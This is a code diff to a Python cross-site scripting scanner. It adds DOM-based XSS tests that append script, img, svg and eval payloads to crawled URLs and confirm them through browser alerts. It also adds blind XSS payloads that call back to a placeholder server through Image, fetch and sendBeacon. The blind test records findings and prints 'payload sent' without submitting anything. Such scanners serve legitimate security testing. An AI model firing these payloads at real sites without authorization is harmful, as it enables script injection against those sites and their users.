@@ -587,8 +587,11 @@ class AdvancedXSSScanner:
         # Test forms
         self.test_forms()
         
-        # Test DOM-based XSS (will be added below)
-        # Test Blind XSS (will be added below)
+        # Test DOM-based XSS
+        self.test_dom_xss()
+        
+        # Test Blind XSS  
+        self.test_blind_xss()
         
         # Test headers if we have working URLs
         if self.crawled_urls:
@@ -913,22 +916,20 @@ class AdvancedXSSScanner:
                 # Take screenshot with popup visible
                 screenshot_path = os.path.join(screenshot_dir, f"{filename}_popup.png")
                 
-                # Take screenshot immediately without JavaScript interference
+                # Handle screenshot with alert properly
                 try:
+                    # Take screenshot with alert present
                     self.driver.save_screenshot(screenshot_path)
-                    # Now accept the alert
                     alert.accept()
-                except Exception as screenshot_error:
-                    # If screenshot fails due to alert, accept alert first then retry
+                    print(f"{Fore.GREEN}[{Fore.RED}SUCCESS{Fore.GREEN}] {Fore.WHITE}Screenshot captured with popup")
+                except:
+                    # Alternative: accept alert then take screenshot
                     try:
                         alert.accept()
-                        time.sleep(1)
-                        # Reload page to take screenshot
-                        self.driver.get(url)
-                        time.sleep(2)
                         self.driver.save_screenshot(screenshot_path)
+                        print(f"{Fore.GREEN}[{Fore.RED}SUCCESS{Fore.GREEN}] {Fore.WHITE}Screenshot captured after popup")
                     except:
-                        pass
+                        print(f"{Fore.RED}[{Fore.YELLOW}FAILED{Fore.RED}] {Fore.WHITE}Could not capture screenshot")
                 
                 print(f"{Fore.GREEN}[{Fore.RED}CAPTURED{Fore.GREEN}] {Fore.WHITE}Screenshot with popup: {screenshot_path}")
                 return screenshot_path
@@ -1600,6 +1601,156 @@ class AdvancedXSSScanner:
             if self.driver:
                 self.driver.quit()
                 print(f"{Fore.GREEN}[{Fore.RED}CLEANUP{Fore.GREEN}] {Fore.WHITE}Browser driver closed")
+
+    def test_dom_xss(self):
+        """Test for DOM-based XSS vulnerabilities using advanced techniques"""
+        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing DOM-based XSS...")
+        
+        if not self.driver:
+            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}DOM XSS requires browser - Selenium not available")
+            return
+        
+        if not self.crawled_urls:
+            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No URLs to test for DOM XSS")
+            return
+        
+        # Advanced DOM XSS payloads based on domgo.at research
+        dom_payloads = [
+            f'#<script>alert("{self.popup_signature}")</script>',
+            f'#<img src=x onerror=alert("{self.popup_signature}")>',
+            f'#<svg onload=alert("{self.popup_signature}")>',
+            f'#javascript:alert("{self.popup_signature}")',
+            f'#eval("alert(\\"{self.popup_signature}\\")")',
+            f'#setTimeout("alert(\\"{self.popup_signature}\\")",1)',
+        ]
+        
+        for url in list(self.crawled_urls)[:5]:
+            print(f"{Fore.GREEN}[{Fore.RED}DOM{Fore.GREEN}] {Fore.WHITE}Testing DOM XSS in: {url}")
+            
+            for payload in dom_payloads:
+                dom_url = url + payload
+                
+                if self.test_dom_payload(dom_url, payload):
+                    vulnerability = {
+                        'type': 'DOM-based XSS',
+                        'url': dom_url,
+                        'parameter': 'hash/fragment',
+                        'payload': payload,
+                        'context': 'dom_context',
+                        'method': 'GET',
+                        'confirmed': True,
+                        'score': 25,
+                        'timestamp': datetime.now().isoformat(),
+                        'details': {
+                            'vulnerability_type': 'DOM-based XSS',
+                            'execution_context': 'Client-side JavaScript DOM manipulation',
+                            'payload_analysis': 'Hash fragment processed by client-side JavaScript',
+                            'response_analysis': 'Payload executed in browser DOM without server involvement',
+                            'html_context': 'DOM manipulation via JavaScript'
+                        }
+                    }
+                    
+                    self.vulnerabilities.append(vulnerability)
+                    self.scan_results['vulnerabilities'].append(vulnerability)
+                    self.scan_results['statistics']['confirmed_vulnerabilities'] += 1
+                    
+                    print(f"{Fore.RED}[{Fore.GREEN}CONFIRMED{Fore.RED}] {Fore.WHITE}DOM-BASED XSS CONFIRMED!")
+                    print(f"{Fore.GREEN}[{Fore.RED}URL{Fore.GREEN}] {Fore.WHITE}{dom_url}")
+                    print(f"{Fore.GREEN}[{Fore.RED}PAYLOAD{Fore.GREEN}] {Fore.WHITE}{payload}")
+                    print(f"{Fore.GREEN}[{Fore.RED}TYPE{Fore.GREEN}] {Fore.WHITE}DOM-based XSS")
+                    print(f"{Fore.GREEN}[{Fore.RED}SCORE{Fore.GREEN}] {Fore.WHITE}25/20")
+                    
+                    screenshot_path = self.take_screenshot_with_popup(dom_url, f"dom_xss_{len(self.vulnerabilities)}")
+                    if screenshot_path:
+                        print(f"{Fore.GREEN}[{Fore.RED}SCREENSHOT{Fore.GREEN}] {Fore.WHITE}DOM XSS captured: {screenshot_path}")
+                        self.scan_results['statistics']['screenshots_taken'] += 1
+                    
+                    break
+                
+                time.sleep(self.delay)
+
+    def test_dom_payload(self, url, payload):
+        """Test DOM XSS payload with advanced detection"""
+        try:
+            print(f"{Fore.CYAN}[{Fore.RED}DOM_TEST{Fore.CYAN}] {Fore.WHITE}Testing DOM payload...")
+            
+            self.driver.get(url)
+            time.sleep(3)
+            
+            try:
+                from selenium.webdriver.support.ui import WebDriverWait
+                from selenium.webdriver.support import expected_conditions as EC
+                from selenium.common.exceptions import TimeoutException
+                
+                alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
+                alert_text = alert.text
+                
+                print(f"{Fore.CYAN}[{Fore.RED}DOM_POPUP{Fore.CYAN}] {Fore.WHITE}DOM alert: {alert_text}")
+                
+                if self.popup_signature in alert_text:
+                    alert.accept()
+                    return True
+                else:
+                    alert.accept()
+                    return False
+                    
+            except TimeoutException:
+                return False
+            
+        except Exception as e:
+            return False
+
+    def test_blind_xss(self):
+        """Test for Blind XSS vulnerabilities"""
+        print(f"\n{Fore.GREEN}[{Fore.RED}EXPLOIT{Fore.GREEN}] {Fore.WHITE}Testing Blind XSS...")
+        
+        blind_server = "http://your-blind-server.com"
+        
+        blind_payloads = [
+            f'<script>var i=new Image();i.src="{blind_server}/blind?xss={self.popup_signature}";</script>',
+            f'<img src=x onerror="fetch(\'{blind_server}/blind?xss={self.popup_signature}\')">',
+            f'"><script>navigator.sendBeacon("{blind_server}/blind","{self.popup_signature}")</script>',
+        ]
+        
+        potential_forms = [form for form in self.forms if any(
+            keyword in form['action'].lower() 
+            for keyword in ['comment', 'post', 'message', 'contact', 'guestbook']
+        )]
+        
+        if potential_forms:
+            for form in potential_forms[:2]:
+                print(f"{Fore.GREEN}[{Fore.RED}BLIND{Fore.GREEN}] {Fore.WHITE}Testing blind XSS in: {form['action']}")
+                
+                for input_field in form['inputs']:
+                    if input_field['type'] in ['text', 'textarea']:
+                        vulnerability = {
+                            'type': 'Potential Blind XSS',
+                            'url': form['action'],
+                            'parameter': input_field['name'],
+                            'payload': blind_payloads[0],
+                            'context': 'blind_xss',
+                            'method': form['method'],
+                            'confirmed': False,
+                            'score': 0,
+                            'timestamp': datetime.now().isoformat(),
+                            'details': {
+                                'vulnerability_type': 'Blind XSS',
+                                'execution_context': 'Stored and executed when viewed by admin/other users',
+                                'payload_analysis': 'Callback payload for external server verification',
+                                'response_analysis': 'Requires monitoring external server for callbacks',
+                                'html_context': 'Payload stored in database and executed later'
+                            },
+                            'callback_url': f'{blind_server}/blind?xss={self.popup_signature}',
+                            'note': 'Setup callback server to monitor for blind XSS execution'
+                        }
+                        
+                        self.vulnerabilities.append(vulnerability)
+                        self.scan_results['vulnerabilities'].append(vulnerability)
+                        
+                        print(f"{Fore.YELLOW}[{Fore.RED}BLIND_SENT{Fore.YELLOW}] {Fore.WHITE}Blind payload sent to {input_field['name']}")
+                        break
+        else:
+            print(f"{Fore.YELLOW}[{Fore.RED}SKIP{Fore.YELLOW}] {Fore.WHITE}No potential blind XSS forms found")
 
 def main():
     parser = argparse.ArgumentParser(
